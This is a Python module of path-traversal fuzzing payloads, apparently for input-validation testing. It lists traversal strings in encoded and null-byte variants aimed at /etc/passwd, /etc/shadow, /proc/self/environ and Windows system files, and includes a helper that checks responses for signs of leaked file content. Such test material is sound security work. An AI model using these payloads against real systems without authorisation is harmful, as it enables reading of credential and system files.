"""Path-traversal fuzzing payloads for R5 input validation testing."""

from __future__ import annotations

SENSITIVE_TARGETS: list[str] = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
]

UNIX_PAYLOADS: list[str] = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "/etc/passwd",
    "/./../../../etc/passwd",
    "..\\..\\..\\etc\\passwd",
]

WINDOWS_PAYLOADS: list[str] = [
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\win.ini",
    "..%5C..%5C..%5CWindows%5Cwin.ini",
]

NULL_BYTE_PAYLOADS: list[str] = [
    "../../../etc/passwd%00.txt",
    "../../../etc/passwd\x00.png",
]

ALL_PAYLOADS: list[str] = UNIX_PAYLOADS + WINDOWS_PAYLOADS + NULL_BYTE_PAYLOADS

INDICATORS: list[str] = [
    "root:x:0:0",
    "root:*:0:0",
    "[extensions]",
    "localhost",
    "127.0.0.1",
    "HOME=",
    "PATH=",
    "USER=",
]


def looks_like_traversal_success(response_text: str) -> bool:
    """Heuristic: does the response contain content from a sensitive file?"""
    lower = response_text.lower()
    return any(ind.lower() in lower for ind in INDICATORS)
